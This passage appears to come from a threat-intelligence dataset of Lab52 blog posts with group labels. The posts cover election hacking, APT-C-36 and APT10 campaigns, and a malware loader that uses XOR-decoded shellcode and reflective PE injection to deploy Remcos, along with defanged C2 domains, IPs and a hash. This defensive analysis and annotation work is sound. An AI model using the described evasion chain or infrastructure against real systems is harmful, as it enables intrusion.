the 450 seats that make up the Duma, increasing its parliamentary representation to 105 seats, thus becoming a constitutional majority. But the question before us is … Could Russia (or any other State / Group) alter the outcome of the elections by taking advantage of cyberattacks. Is Putin trying to meddle in the US presidential elections. Is there a conspiracy of the Kremlin to help Trump in the race for the White House. Let’s just stay with the first question or we will fry our brains… Could the outcome of the elections be altered by taking advantage of cyberattacks. ---------------------------------------------------------------------------------- [Rapid7 Community](https://community.rapid7.com/community/infosec/blog/2016/09/19/hacking-the-election-what-to-expect) points out that in many states the online vote has no encryption, they have doubts about the security of the voting machines, and agree that while technology makes our life easier, it also introduces some risks, but that, in this case they would be quite controlled and altering the outcome of the elections would be very unlikely. In [Krypt3ia](https://krypt3ia.wordpress.com/2016/10/11/scenarios-on-outcomes-from-russian-information-operations-on-the-us-2016-election/) they pose some possible attack scenarios –sure that our readers who have a very twisted mind, would come up with one or more- and the potential damages they would make if they were successful are the following: 1.**Manipulation of the voting machine.** Let us remember that the voters commonly do it through an Electoral System of Optical Scanning or voting machines. Physical access to them is needed to manipulate them. It seems unlikely to manipulate them according to official sources, but not impossible. This situation has been highly discussed over the past few years. 2.**Manipulation of voter lists.** A scenario based on the latest developments. Hacking the database of voters in key states could cause chaos on Election Day. One could, for example, manipulate the voting intention polls, disable voters on the voting day claiming they have requested a postal vote … etc. In the year 2000, [some sources](http://elpais.com/diario/2004/10/29/internacional/1099000816_850215.html) claimed fraud in Florida by manipulating certain parameters in the lists of voters – it was requested that criminals be deleted from them (as they cannot vote) and, it is argued, more than 90,000 people were eventually eliminated who did have the right to vote. (In line with this, I leave you the documentary [Hacking Democracy](https://es.wikipedia.org/wiki/Hacking_Democracy) documenting some research of US citizens on anomalies / irregularities with the electronic voting system they detected during the presidential election to the USA in 2000 and 2004, especially in the County of Volusia (Florida)). The US-CERT is aware of the risks involved with databases of voter registration, and even offers a [number of tips](https://www.us-cert.gov/ncas/tips/ST16-001) for prevention. 3.**Disruption of the electronic process.** Imagine malware in electoral machines that could block them. We would have to stop using them and other means would be used such as ballots, other machines, thus considerably lengthening the process and entering into a state of contingency (…we have already done this in Spain without anyone hacking us :). Let us remember that in the Ukraine, three days before the elections, the main servers of the Central Electoral Commission [were compromised](https://sputniknews.com/voiceofrussia/news/2014_05_23/CyberBerkut-announces-destruction-of-electronic-system-of-Ukraines-Central-Election-Commission-5809/) and the Security Service of the Ukraine [also discovered](http://www.pravda.com.ua/news/2014/05/23/7026217/) a virus installed on the servers, which would have destroyed the election results. In any of the three scenarios, **confidence in the electronic system would be partially or totally degraded and the entire electoral system would be in doubt**. In fact, it is not necessary for these cyberattacks to be successful, but to make enough ‘noise’ to sow doubt in the system and that in itself is a significant damage in this information war in which we are immersed. Finally, I must state that Russia considers all these accusations as ‘anti-Russian hysteria’, and you, what do you think. ¿Information warfare by Clinton. Trump . Or is it really Putin. We only know that we know nothing."
annoctr,annoctr/AnnoCTR/text/train/lab52_2019-10-18_cyber-iii-cold-war-hack.txt,lab52_2019-10-18_cyber-iii-cold-war-hack,G0035,"(Cyber) III Cold War: Hack the vote? October 18, 2019 As you now, the DHS (Department of Homeland Security) along with the ODNI (Office of the Director of National Intelligence) [formally accused](https://www.odni.gov/index.php/newsroom/press-releases/215-press-releases-2016/1423-joint-dhs-odni-election-security-statement) Russia of meddling in the past US presidential elections with techniques from the burning information warfare and various cyberattacks. Let’s take a (somewhat delayed) look at this. ![This image has an empty alt attribute; its file name is imagen1post.png] (https://www.securityartwork.es/wp-content/uploads/2016/10/imagen1post.png) It is not the first time that USA launches accusations of this caliber, it did so when it accused China of stealing trade secrets in 2014. An accusation of this kind could involve, officially or unofficially, attacks on Russian IT infrastructures that posed a headache for Putin and his allies. [According to statements in the NYT](http://www.nytimes.com/2016/10/09/us/politics/what-options-does-the-us-have-after-accusing-russia-of-hacks.html?_r=1) taking this type of action would involve too much risk with elections less than a month away; cyberattacks by a power like Russia against the US electronic voting system could wreak havoc. It should also be noted that the electoral system is still not considered a critical infrastructure of the nation, although it may increase their criticality shortly. As we told you in the first issue of this saga [(in spanish)](https://www.securityartwork.es/2015/10/20/cyber-guerra-fria-i-ataque-a-tv5monde/), Russia, like other States, has (always supposedly) conducted PSYOP (Psychological Operations) to misinform, to create confusion or discord for the sake of their own benefit, and that includes operations in cyberspace. Historically, Russia is an expert in the use of information for personal gain (just study propaganda operations of Spetsnaz). Events, among others, like the parliamentary elections in Ukraine in 2007, the Ukraine-Russia gas dispute in 2005, [the power outage](https://www.securityartwork.es/2016/02/23/the-blackout-revisited/) the Ukraine experienced earlier this year or the Russian-Chechen conflict manifest the (obvious and known) Russian interest in its geographical area of influence, actions allegedly attributed to **APT28** which we discussed in the second issue of this saga [(in spanish)](https://www.securityartwork.es/2016/07/19/cyber-guerra-fria-ii-grupo-sofacy/). Returning to the other side of the pond … recently in Illinois there was an intrusion into the electoral electronic system which involved **the theft of 200,000 voters’ registers**. The same happened in Arizona, but it seems that despite having suffered a similar intrusion they failed to filter information. The White House Press Secretary, Josh Earnest, [explained](https://www.whitehouse.gov/the-press-office/2016/08/30/press-briefing-press-secretary-josh-earnest-8302016) that the attack was under investigation, though back then they did not dare ensure which government or criminal group could be behind the attack. ![](https://www.securityartwork.es/wp-content/uploads/2016/10/imagen2post.png) The (dis) information is power ------------------------------ The ‘Russian presence’ has been hanging around for months around the American electoral environment. This summer, Wikileaks published about 20,000 emails stolen from officers of the Democratic National Committee, [many of them embarrassing] (http://theduran.com/julian-assange-says-1700-emails-hillary-clintons-collection-proves-sold-weapons-isis-syria/). This leak cost the resignation of the president of the Democratic Party, damaged (and continues to…) the reputation of Clinton’s entourage, and caused them to be accused (between racks) of the attack on the Russian intelligence, as published in ‘[The Washington Post] (https://www.washingtonpost.com/politics/hacked-emails-cast-doubt-on-hopes-for-party-unity-at-democratic-convention/2016/07/24/a446c260-51a9-11e6-b7de-dfe509430c39_story.html?hpid=hp_hp-top-table-main_campaign-132pm%3Ahomepage%2Fstory)‘ and ‘[The New York Times] (http://www.nytimes.com/2016/07/25/us/politics/donald-trump-russia-emails.html?%20hp&action=click&pgtype=Homepage&clickSource=story-heading&module=first-column-region&region=top-news&WT.nav=top-news&_r=0)’. Groups like APT28 (already mentioned) and APT29 were identified as possible culprits. As PSYOP was a perfect play; at the right time, and measuring well the tempos, all the dirty rags of the party begin to be exfiltrated, a new scandal added to the ” Hillary’s emails ” case, when it was uncovered that she used a private mail server to handle, supposedly, confidential information during her time as Secretary of State. ![](https://www.securityartwork.es/wp-content/uploads/2016/10/imagen3post-740x346.png) As my friend Miguel (who you can read about in [this recommended blog)](http://www.areopago21.org/) tells me, “*You must remember that throughout history, Russia and the USSR before that, has a long history of “[active measures](https://en.wikipedia.org/wiki/Active_measures)” to manipulate, ranging from propagandistic actions, the falsification of official documents to more [extreme domestic violence](https://www.amazon.es/Mitrokhin-Archive-Europe-Penguin-History/dp/0140284877)*“. We’ve already talked of [The Agency](http://www.nytimes.com/2015/06/07/magazine/the-agency.html?_r=0) in another article in this series, Russian troll factory, supposedly serving the Kremlin. To add more ‘juice’ to the matter, [Michael T. Flynn](https://en.wikipedia.org/wiki/Michael_T._Flynn), former director of the DIA (Defense Intelligence Agency) and criticized for his affinity and good relations with Russia, is one of Trump’s advisors and his name even came up to occupy the vicepresidency. The return of the KGB. The increase of espionage capabilities. -------------------------------------------------------------- According to some Russian [unofficial sources](http://kommersant.ru/doc/3093174), Russia is planning to create a super-security agency called **Ministry of State Security** (MGB, МГБ), a name used in the past to define the Soviet intelligence agency of the Stalin era between 1946 and 1953. Its main functions were to be the ‘secret police’, espionage and counterespionage and promoting a policy of surveillance and monitoring to maintain control and prevent disloyalty. Although this information has not been confirmed by official sources, several experts on Russian security services and a former KGB colonel -Gennady Gudkov- said it would be very likely indeed that Putin carried out this reform in the intelligence services with the aim, among others, that the management of security agencies be more effective, and help eradicate corruption within agencies. This new ministry would be trained on the FSB, could also understand the FSO and the SVR, resembling, according to Kommersant and other experts with the KGB, in which Putin in fact managed to acquire the rank of lieutenant colonel. Let us recall that the KGB was split into separate institutions during the collapse of the Soviet Union in 1991. According to the researcher, [Andrei Soldatov](http://echo.msk.ru/programs/albac/41311/), some of the military operations in cyberspace attributed to Russia were coordinated by the FSB by which a ‘new KGB’ in these times, could mean the return to the old cold war in a new more technological environment and of which we know Russia has a strong technical control. But as I said, **this is all speculation**. We must keep in mind that United Russia, the party of Vladimir Putin, obtained 343 of the 450 seats that make up the Duma, increasing its parliamentary representation to 105 seats, thus becoming a constitutional majority. But the question before us is … Could Russia (or any other State / Group) alter the outcome of the elections by taking advantage of cyberattacks. Is Putin trying to meddle in the US presidential elections. Is there a conspiracy of the Kremlin to help Trump in the race for the White House. Let’s just stay with the first question or we will fry our brains… Could the outcome of the elections be altered by taking advantage of cyberattacks. ---------------------------------------------------------------------------------- [Rapid7 Community](https://community.rapid7.com/community/infosec/blog/2016/09/19/hacking-the-election-what-to-expect) points out that in many states the online vote has no encryption, they have doubts about the security of the voting machines, and agree that while technology makes our life easier, it also introduces some risks, but that, in this case they would be quite controlled and altering the outcome of the elections would be very unlikely. In [Krypt3ia](https://krypt3ia.wordpress.com/2016/10/11/scenarios-on-outcomes-from-russian-information-operations-on-the-us-2016-election/) they pose some possible attack scenarios –sure that our readers who have a very twisted mind, would come up with one or more- and the potential damages they would make if they were successful are the following: 1.**Manipulation of the voting machine.** Let us remember that the voters commonly do it through an Electoral System of Optical Scanning or voting machines. Physical access to them is needed to manipulate them. It seems unlikely to manipulate them according to official sources, but not impossible. This situation has been highly discussed over the past few years. 2.**Manipulation of voter lists.** A scenario based on the latest developments. Hacking the database of voters in key states could cause chaos on Election Day. One could, for example, manipulate the voting intention polls, disable voters on the voting day claiming they have requested a postal vote … etc. In the year 2000, [some sources](http://elpais.com/diario/2004/10/29/internacional/1099000816_850215.html) claimed fraud in Florida by manipulating certain parameters in the lists of voters – it was requested that criminals be deleted from them (as they cannot vote) and, it is argued, more than 90,000 people were eventually eliminated who did have the right to vote. (In line with this, I leave you the documentary [Hacking Democracy](https://es.wikipedia.org/wiki/Hacking_Democracy) documenting some research of US citizens on anomalies / irregularities with the electronic voting system they detected during the presidential election to the USA in 2000 and 2004, especially in the County of Volusia (Florida)). The US-CERT is aware of the risks involved with databases of voter registration, and even offers a [number of tips](https://www.us-cert.gov/ncas/tips/ST16-001) for prevention. 3.**Disruption of the electronic process.** Imagine malware in electoral machines that could block them. We would have to stop using them and other means would be used such as ballots, other machines, thus considerably lengthening the process and entering into a state of contingency (…we have already done this in Spain without anyone hacking us :). Let us remember that in the Ukraine, three days before the elections, the main servers of the Central Electoral Commission [were compromised](https://sputniknews.com/voiceofrussia/news/2014_05_23/CyberBerkut-announces-destruction-of-electronic-system-of-Ukraines-Central-Election-Commission-5809/) and the Security Service of the Ukraine [also discovered](http://www.pravda.com.ua/news/2014/05/23/7026217/) a virus installed on the servers, which would have destroyed the election results. In any of the three scenarios, **confidence in the electronic system would be partially or totally degraded and the entire electoral system would be in doubt**. In fact, it is not necessary for these cyberattacks to be successful, but to make enough ‘noise’ to sow doubt in the system and that in itself is a significant damage in this information war in which we are immersed. Finally, I must state that Russia considers all these accusations as ‘anti-Russian hysteria’, and you, what do you think. ¿Information warfare by Clinton. Trump . Or is it really Putin. We only know that we know nothing."
annoctr,annoctr/AnnoCTR/text/train/lab52_2020-01-15_apt-c-36-recent-activity.txt,lab52_2020-01-15_apt-c-36-recent-activity,G0099,"APT-C-36 recent activity analysis January 15, 2020 From Lab52 we have been tracking during the last months the activity of the group APT-C-36. This group was named and publicly introduced by the Company 360 [1] last year. In this article is highlighted as the main objective of the group, the companies located in Colombia. If you don’t know APT-C-36, we recommend the article mentioned [1] for more information. In July 2019 the company TrendMicro published an article related to another group [2] that also seems to be focused on Colombia and some **TTPs** (**T**actics, **T**echniques and **P**rocedures) overlap with APT-C-36 although TrendMicro indicates that they don’t consider this group as an advanced. Lab52 has had access to different very recent spear-phishings and the following summary information has been obtained from the analysis of these mails: * This is a group that, as already mentioned in the articles [1] and [2], knows well the Spanish language. * They usually use different types of url shorteners in their mailings. The case of “cort.as” shortenner has caught our attention since it is a shortener from the Spanish newspaper “El Pais” that belongs to the “Prisa Group” very spread in Latin America. * We have also seen links to docs.google.com, mediafire and onedrive to download the samples inside some malspam emails. * Their most popular malware is LimeRAT, although many others have been found as indicated in the reports. VJWorm has also been seen recently with different techniques for exfiltration. * It has also been observed from some spear-phishings the exfiltration by Yopmail’s HTTPS webmail service. This coincides with the indications of TrendMicro * The most common dynamic domains seen are: 1.duckdns.]org 2.publicvm.]com 3.linkpc.]net Since Lab52 does not have enough information to be able to say that everything analyzed is a single group, it can only be said that these are different techniques used to attack a country. From this information, the infrastructure used by the attackers as command and control servers when executing the malware has been analyzed and the following graph has been obtained: ![](https://lab52.io/blog/wp-content/uploads/2020/01/image1.png) Three sets (clusters) of ip addresses have been identified and each one has some characteristics: ***Cluster A*** has the following characteristics: * All its infrastructure is geolocated in Colombia. All the IPs correspond to Colombian ISPs’ IPs. This is perhaps one of the most outstanding aspects. * Domains are reused and the ip to which it points is changed. * This cluster only uses free “duckdns.org” domains. ***Cluster B*** has the following characteristics: * Its infrastructure is located in Colombia, Costa Rica and Panama. The geolocated ip’s in the United States correspond to domains that have been “sinkholed”. By obtaining more information about the IPs, it can be seen how they are using a VPN service that allows having geolocalized IPs in Colombia, Costa Rica and Panama. The service is called “Powerhouse Management” (phmgmt[.]com). Therefore this cluster is not compromising infrastructure of Colombian ISP clients, but is using this VPN service. * This cluster is reusing domains and changing ip addresses a lot. They have a very short duration. * This cluster uses as SLD linkpc.net and publicvm.com. * This cluster coincides with part of the domains registered in the report of the Chinese company 360 on APT-C-36. **Cluster C** has the following characteristics: * All its infrastructure is geolocated in Colombia. All the IPs correspond to Colombian ISPs’ IPs. * In this case many domains are used and few ip addresses. * This cluster uses free domains duckdns.org. Among the domains used by these group/s we highlight the domain: * **cobroserfinansa[.]com**: This domain has solved more than 150 different ip’s (157 exactly when this report was made) where all of them have been located in Colombia. Another outstanding aspect from the infrastructure point of view is that the ip’s located in Colombia correspond with a high probability to ip’s of routers compromised by the attackers. Lab52 hypothesis is that attackers compromise routers with default credentials and use them as a frontend for their real command and control server. This fact has not been verified by Lab52, but has been observed as a common TTP for other groups. The routers seen, allow the use of the iptables command so automation by attackers for redirection is simple. Conclusions ----------- * The attackers know well the language of the attacked country, Spanish, so it could be considered Spanish-speaking countries as the main options of attacking countries. This aspect has already been indicated in the other reports. From Lab52 we would reinforce this hypothesis by the use of a shortener “cort.as”. * The emails are well written and are almost always related to financial matters, specifically related to debt. * Currently, the attackers are not using malware developed by themselves and are using public malware projects such as LimeRAT. * Attackers are using high ports to communicate with command and control servers. * Attackers are probably using multi-level command and control architectures to hide the main command and control server. As a first level, they have used until the moment: + VPN services where Colombia, Panama and Costa Rica exist as an outgoing ip + Routers from ISP clients with default credentials or vulnerabilities. All these ISPs belong to Colombia. * Attackers use shorteners for links in emails. It is advisable to watch out for shortcuts belonging to the newspaper “El Pais”. * Another option to the shorteners are links to file hosting services (google, mediafire, dropbox, etc. [1] <https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/> [2] <http://blog.la.trendmicro.com/proyecto-rat-una-campana-de-spam-dirigida-a-entidades-colombianas-a-traves-del-servicio-de-correo-electronico-yopmail/>"
annoctr,annoctr/AnnoCTR/text/train/lab52_2020-02-18_the-role-of-china-in.txt,lab52_2020-02-18_the-role-of-china-in,G0045,"The role of China in the Persian Gulf and potential cyberthreats: February 18, 2020 After the rise of tensions between the US and Iran due to the US military operation that ended the life of the Iranian General Qasem Soleimani and the Iraqi Commander Abu Mahdi al-Muhandis ([12]), Iran carried out an attack with missiles against two US military bases located in Iraq ([13]). These events have generated a climate of uncertainty and an increase of geopolitical risk in one of the most relevant areas, the Persian Gulf. This fact does not only involve the US and Iran, furthermore it involves other actors with a high influence in the world order such as China. This phenomenon could provoke that China carries out certain strategies to keep its energy interests safeguarded in the Middle East area. During 2019, some technical traces were detected and this traces where potentially related to certain APT groups presumably associated with the People’s Republic of China (APT10) that would be carrying out malicious campaigns against various targets like critical infrastructures organizations among others ([14]) ([15]). In the past, the relationship between Tehran and Beijing was based on a trade agreement focused in the exchanging of crude oil and weapons ([19]). Regarding the second point, in the war between Iran and Iraq (1980-1988), when the targets of both actors were the oil stations and oil freighters, reaching the blockade of the Strait of Hormuz, the situation began to be unsustainable from the point of view of the trade of crude. In order to reduce the tension, the USSR and the USA, agreed in 1985 to cease the sale of weapons. However, according to the Stockholm International Institute for Peace, China was always faithful to Iran to keep the arm sales operations and currently it is still being one of the most relevant Iran’s partners ([21]). The Chinese interests in Iran directly clashed with the long-standing confrontation between the USA and Iran since the fall of Shah M. Reza Pahlavi and subsequently with the power of Ayatollah R. Khomeini in 1979, establishing the Islamic Republic of Iran, thus Islamic Revolution ended its westernization. That’s why, currently the new commercial approach between the US and China comes with the US imposition to try to finish within the crude oil trade with Iran. Consequently, china has significantly reduced its crude oil imports from Iran since the US again imposed sanctions during November 2018 ([16]). During 2015, the Obama Administration carried out jointly with Iran, Germany, Great Britain, China, France and Russia, the Tehran nuclear agreement, at those time China significantly increased its commercial ties with Iran. During 2016, Iran and China agreed to expand bilateral ties and increase trade to $ 600 billion by 2025. This business planning was truncated at the time that the Trump Administration withdrew from the Nuclear Pact. Chinese imports of Iranian crude oil fell from 650,000 barrels per day to an average of 140,000 barrels in recent months ([16]). China, in response to the impossibility of establishing and developing business operations with Iran, imported a total of 76.3 million tons of crude oil from Saudi Arabia in the first 11 months of last year, 53% more than in the same period of 2018 ([16]). On the other hand, Iranian oil exports fell to 14.4 million tons. Moreover, China has a relative neutral role in the Iran-USA conflict, Pekin is trying to strength the ties with Saudi Arabia, looking to supply them specific military material and weapons that the USA does not supply them as the CH-4 UAV drones, similar to the American MQ-1 Predator ([21]). China aims to balance its crude oil suppliers against the rise of instability in the Middle East. In addition, China is one of the world’s leading oil consumers, this means that its economy has an important high dependence on oil. As can be seen in the following table, China remain in the second place in the top of oil consumers after the US ([6]). | **Country** | **M. barrels per day** | **Share of world total** | | United States | 19.96 | 20% | | China | 13.57 | 14% | | India | 4.34 | 4% | | Japan | 3.92 | 4% | | Russia | 3.69 | 4% | | Saudi Arabia | 3.33 | 3% | | Brazil | 3.03 | 3% | | South Korea | 2.63 | 3% | | Germany | 2.45 | 2% | | Canada | 2.42 | 2% | | Total top 10 | 59.33 | 60% | | World total | 98.76 | | *Illustration 1. Oil consumption (2018)* Moreover, as can be seen in the following graph, China ranks fifth in the ranking of oil producing countries in the worldwide ([6]): | **Country** | **Million barrels per day** | **Share of world total** | | United States | 17.94 | 18% | | Saudi Arabia | 12.42 | 12% | | Russia | 11.40 | 11% | | Canada | 5.38 | 5% | | China | 4.81 | 5% | | Iraq | 4.62 | 5% | | Iran | 4.46 | 4% | | United Arab Emirates| 3.79 | 4% | | Brazil | 3.43 | 3% | | Kuwait | 2.91 | 3% | | Total top 10 | 71.15 | 71% | | World total | 100.89 | | *Illustration 2. Origin of oil imports in China.* The graph shows us that a significant part of China’s oil suppliers comes from politically unstable regions and must be transported through narrow and sea lanes disputed with other States with high military competence. It is relevant for China to keep these logistic access roads insured to keep its development and economic expansion. In addition, this dependence on foreign energy resources is likely to increase considerably. It is expected that in 2040 about 80% of the oil consumed by China will come from other States ([7]). For this reason, China is interested in investigating and controlling the instability in the Middle East, since a significant percentage of its oil imports come from Iran, Iraq, Saudi Arabia, Oman and Kuwait, all within the Persian Gulf. To maintain this flow of energy resources, China and the Saudi King Salman signed an oil trade agreement for $ 65 billion in 2017 ([8]). In addition, the OBOR route, the main international route to carry out the transport of goods, is increasingly getting consolidated and more functional. ![](https://lab52.io/blog/wp-content/uploads/2020/02/image-10.png) *Illustration 3. OBOR route for the oil trade.* Currently, all imports from Iran and Saudi Arabia are introduced into China through the Malacca Canal, near the South China Sea. Probably, the presence and influence of China in the Middle East is not going to be militarily. However, it constantly looks for diplomatic and business opportunities to acquire organizations from the energy sector in order to accomplish their future energy demands ([9]). These business and diplomatic opportunities could be preceded by cyber espionage operations with the purpose of acquiring advantages in the sector. Organizations in the energy sector have important confidential information that certain governments may be highly interested in. The energy organizations which are located in certain Middle East locations of interest of China would be a potential target of cyberespionage. CAMPAIGN AGAINST THE USA ADMINISTRATION AND THE ENERGY SECTOR During 2019, a malicious campaign was executed against US public sector organizations. This campaign, due to the macros used, is likely to be attributed to APT10, a group allegedly linked to the Ministry of Security and Intelligence of China ([1]) ([18]). The malware used was “Lookback. The spear phishing carried out an impersonation of GEC (Global Energy Certification) to offer certain certification courses ([2]). Topic which would be highly interesting for critical infrastructure or energy professionals. Several spear phishing emails came from the following malicious domain: globalenergycertification[.]Net. The same domain was used in previous malicious campaigns. The hostile actor tries to impersonate a licensing agency that is linked to the public sector globalenergycertification[.]Org. In the body of the email, topics are included to impersonate the “Global Energy Certification” (GEC). The word file attached in the email has the macros that once is downloaded and executed infects the systems of the victim ([2]). During the first stages of the infection it was possible to identify that the attackers carried out a reconnaissance phase through SMB scans on the port 445. This activity was carried out two weeks before to the reception of spear phishing. The delivery was a fake invitation to carry out the exam to get the Global Energy Certification ([2]): ![](https://lab52.io/blog/wp-content/uploads/2020/02/image-11.png) *Illustration 4. Spear phishing email body* The domain globalenergycertification[.]Net resolves to this IP 79.141.169[.]3. In the following chart there are the domains and IPs which were hosted with their respective date and impersonated entity records: | **IP** | **Domain** | **Dates Registered** | **Impersonated entity** | | 79.141.169[.3 | globalenergycertification [.net| August 1 – September 19, 2019| Global Energy Certification (“GEC”) | | 103.253.41 [.75 | globalenergycertification [.net| June 12 – July 30, 2019 | Global Energy Certification (“GEC”) | | 79.141.168[.137| nceess [.com | June 24 – September 19, 2019 | National Council of Examiners for engineering and Survey | | 103.253.41[.75 | nceess [.com | May 29 – June 19, 2019 | National Council of Examiners for engineering and Survey | It has been identified that Lookback samples use the same C&C 103.253.41 [.45. In the MISP (Malware Information Sharing Platform) is showed the IPs shared and the domain associated to both malicious campaigns: ![](https://lab52.io/blog/wp-content/uploads/2020/02/image-12.png) *Illustration 5. MISP graphic* CONCLUSIONS A rise of malicious campaigns against the critical infrastructure or even energy sector has been detected. This sector can be decisive for the progress of large economies such as China, the US and the main suppliers of the Middle East energy sector. The instability in the Middle East’s energy sector and the protectionist policies of certain governments are increasing the geopolitical risk and could increase the China’s concern about its own energy supply. The malicious campaign showed before was carried out in 2019. However, the geopolitical tension is getting higher in the Middle East, so it would be possible that more malicious campaigns will come to acquire confidential information for spying purposes. REFERENCES [1] Proofpoint.Lookback and United States. <https://www.proofpoint.com/us/threat-insight/post/lookback-forges-ahead-continued-targeting-united-states-utilities-sector-reveals> [2] Proofpoint.Lookback malware. <https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks> [3] Schroders.2019 Global market prespective. <https://www.schroders.com/en/sysglobalassets/digital/insights/2019/pdfs/q3-2019-global-market-perspective-261959.pdf> [4] NBR.Securing belt and road 2019. [https://www.nbr.org/wpcontent/uploads/pdfs/publications/sr80\_securing\_the\_belt\_and\_road\_sep2019.pdf] (https://www.nbr.org/wp%20content%20/%20uploads%20/%20pdfs%20/%20publications%20/%20sr80_securing_the_belt_and_road_sep2019.pdf) [5] CSIS.China grand strategy. <https://csis-prod.s3.amazonaws.com/s3fs-public/publication/190807_China_Grand_Strategy_Final_Full.pdf> [6] EIA. <https://www.eia.gov/tools/faqs/faq.php?id=709&t=6> [7] World to Export <http://www.worldstopexports.com/top-15-crude-oil-suppliers-to-china/> [8] English Al-Arabiya. China geo-economic interest. <https://english.alarabiya.net/en/views/news/middle-east/2018/08/29/China-s-geo-economic-interests-and-Middle-East-energy-industry.html> [9] Washington Institute. China and the Middle East. <https://www.washingtoninstitute.org/policy-analysis/view/chinas-middle-east-policy-speak-softly-and-wave-a-large-purse> [10] Scrip.Paper Information ID 83914 <http://www.scirp.org/journal/PaperInformation.aspx?PaperID=83914> [11] China Power CSIS. <https://chinapower.csis.org/energy-footprint/> [12] BBC. <https://www.bbc.com/news/world-middle-east-50995792> [13] NBC news. <https://www.nbcnews.com/news/world/u-s-base-iraq-comes-under-attack-missiles-iran-claims-n1112171> [14] Energy Government. <https://www.energy.gov/articles/department-energy-statement-chinese-hacking-global-managed-service-providers> [15] Cyberscoop. <https://www.cyberscoop.com/chinese-linked-apt10-has-been-active-in-the-philippines-researchers-say/> [16] Japan Times. <https://www.japantimes.co.jp/news/2020/01/18/asia-pacific/us-iran-tensions-china-economy/> [17] Middle East Monitor. <https://www.middleeastmonitor.com/20200115-is-the-strait-of-hormuz-the-key-to-iran-asserting-its-dominance/> [18] Lifars <https://lifars.com/2019/08/apt10-targeting-american-utility-companies/> [19] South China Morning Post <https://www.scmp.com/news/china/military/article/3045253/china-and-iran-relationship-built-trade-weapons-and-oil> [20] Brown. <https://www.brown.edu/Research/Understanding_the_Iran_Contra_Affair/i-thebeginning.php> [21] SIPRI <https://www.sipri.org> [22] Atlantic Council.<https://www.atlanticcouncil.org/blogs/menasource/chinas-persian-gulf-strategy-keep-tehran-and-riyadh-content/>"
annoctr,annoctr/AnnoCTR/text/train/lab52_2020-03-23_apt-c-36-new-anti.txt,lab52_2020-03-23_apt-c-36-new-anti,G0099,"APT-C-36 new anti-detection tricks March 23, 2020 Lab52 has recently detected an increase in the efforts carried out by APT-C-36 to improve their capabilities to remain undetected by Anti Malware software, using a more complex infection chain than a simple packer, as they have been doing so far. The sample detected using this new detection evasion technique has a name and icon that tries to supplant a PDF document, which is already a common TTP of this group. ![](https://lab52.io/blog/wp-content/uploads/2020/03/1.png) Until now, these binaries were executables packed with common anti-virus circumvention software, but in this case it is an “SFX Installer” that contains a bunch of files, including some that are simply trash and others that are part of the infection chain: ![](https://lab52.io/blog/wp-content/uploads/2020/03/2.png) When these installers are executed, they create a temporary folder on the system, where they dump all the files they contain, and then execute one of them as an “Entry Point” in the execution/infection chain. In this case, it is called gospels.exe: ![](https://lab52.io/blog/wp-content/uploads/2020/03/3.png) ![](https://lab52.io/blog/wp-content/uploads/2020/03/4.png) This executable consists of a very small program that simply loads dynamically the library “Quoteworthy.dll” that is near the binary, and calls its exported function “Excluders”, passing as parameters some system APIs resolved by the original executable: ![](https://lab52.io/blog/wp-content/uploads/2020/03/5.png) The DLL’s Excluders function simply calls two internal functions: ![](https://lab52.io/blog/wp-content/uploads/2020/03/6.png) The first one (unk\_6D321170), consists of code that is part of the DLL, and that is in charge of deciphering (with an XOR algorithm) a buffer contained in the .data section of the library. Inside this buffer, the function ignores out of every 4 bytes (since they are zeros). After building this buffer, it reserves a memory area with execution permissions and copies there the decoded content. Then it creates an array of 7 elements in which it stores the string “Boondoggle” (which corresponds to a binary file inside the temporary folder), 4 numbers, and the pointers to the functions “GetProcAddres” and “GetModuleHandleA” that match with the ones received as parameters by this DLL: ![](https://lab52.io/blog/wp-content/uploads/2020/03/7.png) ![](https://lab52.io/blog/wp-content/uploads/2020/03/8.png) After that, the first function of this DLL ends and calls the second one, which, at this point of the execution, points to the memory area where it was written the decoded shellcode, and to which it passes as parameter the before mentioned 7-element array. Once it jumps to that shellcode, using GetProcAddres and GetModuleHandle, it extracts a list of Kernel32 Functions that are “hardcoded”: ![](https://lab52.io/blog/wp-content/uploads/2020/03/9.png) It loads the “Boondoggle” file with the CreateFile API and makes a decode with the same XOR key as before, from which it decodes a new complete executable and a small “PE Loader” that allows it to load the executable into memory using the technique known as “ReflectivePEInjection” either in the process itself or in a remote process. After this, it runs the decrypted binary, which repeats the same logic over another section of the “Boondoggle” from which it extracts a second executable, this time consisting of a copy of the “OllyDBG” plug-in called “OllyDBG PE Dumper” which contains overwritten malicious code that is called. ![](https://lab52.io/blog/wp-content/uploads/2020/03/10.png) This dll extracts the final threat and in case the initial binary “gospels.exe” had been executed from the installer arriving by mail, it has been observed that it is injected in a legitimate new process “cmd.exe”. On the other hand, in case it is loaded through its persistence in the registry, it is injected in the process “gospels.exe” itself. An interesting point of this stage of infection is that it tries to remove a file called “turpitude.exe” that should be located in the user’s %APPDATA% folder, but no trace has been observed at any point of the analysis, thus it could be an attempt to clean up tools from previous campaigns of this group, although it has not been able to confirm this fact through the analysis of the threat. Eventually, the final threat remains completely deployed in the memory of the machine, which in this case consists on the “Remcos” remote acces trojan. ![](https://lab52.io/blog/wp-content/uploads/2020/03/11.png) This threat contacts the command and control domain “pruebaremc.]duckdns.org” through port “1010”. IOCS: | SHA256 | E03903AFC4DC4A9DEEDF5442B6D1C8319194F57F1D7620A9C4EBC7D61C436B70 | | DNS | pruebaremc.duckdns.]org |"
annoctr,annoctr/AnnoCTR/text/train/lab52_2020-04-14_china-from-culture-to-conflict.txt,lab52_2020-04-14_china-from-culture-to-conflict,G0004,"China: From culture to conflict in the cyberspace April 14, 2020 Since in 2013 the US cybersecurity consultancy Mandiant published its famous report about APT1, showing its links with different agencies presumably associated with the Chinese government, the news about its actions in cyberspace has been significantly increased. Among others, we find APT15, APT27 or Winnti Group (APT41); the US DoJ’s allegations of cyber espionage towards five Chinese military members associated with the APT1 group; the links that the FBI has established between Zhu Hua and Zhang Shilong and APT10; or the alleged link of PLA unit 61398 (People’s Liberations Army) with APT1. With the permission of Russia and its popular operation against the DNC, China has become the main actor in cyberspace, developing an uncountable number of operations against all kind of sectors as: IT, military or naval industries and different governmental organizations. Sometimes using more sophisticated malware, and sometimes less, but more and more with its own seal linked to its extensive tradition. According to traditional ancient texts, Chinese civilization dates back more than 4,000 years with the first Xia dynasty. Due to the continuity and strength of its political and social structure, the protection of its historical and cultural legacy and the practically null western influence until the 19th century, the Chinese Empire is considered the oldest 